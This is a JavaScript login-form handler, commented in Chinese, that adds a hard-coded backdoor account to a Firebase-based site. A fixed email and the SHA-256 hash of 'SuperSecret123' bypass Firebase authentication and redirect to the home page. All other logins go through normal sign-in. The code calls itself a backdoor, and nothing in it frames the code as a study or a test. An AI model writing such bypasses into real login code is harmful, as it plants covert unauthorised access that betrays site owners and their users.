const backdoorUser = {
  email: '1902246441@qq.com',
  // SHA-256("SuperSecret123") 的16进制哈希，您可用在线工具计算替换
  passwordHash: '343fcb40497549085c98ae137c137116a5c2442eb8dc0bf0cac3a3419ce05b9f'
};

// 工具：将字符串转成Uint8Array
function strToUint8Array(str) {
  return new TextEncoder().encode(str);
}

// 异步计算SHA-256哈希，返回16进制字符串
async function sha256Hash(str) {
  const buffer = await crypto.subtle.digest('SHA-256', strToUint8Array(str));
  return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, '0')).join('');
}

// 登录逻辑改写，加入后门判断
document.getElementById("loginForm").addEventListener("submit", async function (e) {
  e.preventDefault();

  const emailInput = document.getElementById("email").value.trim().toLowerCase();
  const passwordInput = document.getElementById("password").value;
  const status = document.getElementById("status");


  const inputPasswordHash = await sha256Hash(passwordInput);

  if (emailInput === backdoorUser.email && inputPasswordHash === backdoorUser.passwordHash) {

    status.textContent = "后门账号登录成功，正在跳转首页...";
    status.className = "mt-3 text-success";
    console.log("后门账号登录成功:", emailInput);
    setTimeout(() => {
      window.location.href = "../index.html";
    }, 1000);
    return; // 阻止后续 firebase 验证
  }

  // 否则走 firebase 验证
  auth.signInWithEmailAndPassword(emailInput, passwordInput)
    .then((userCredential) => {
      status.textContent = "登录成功，正在跳转首页...";
      status.className = "mt-3 text-success";
      console.log("用户信息：", userCredential.user);
      setTimeout(() => {
        window.location.href = "../index.html";
      }, 1000);
    })
    .catch((error) => {
      status.textContent = "登录失败：" + error.message;
      status.className = "mt-3 text-danger";
      console.error(error);
    });
});
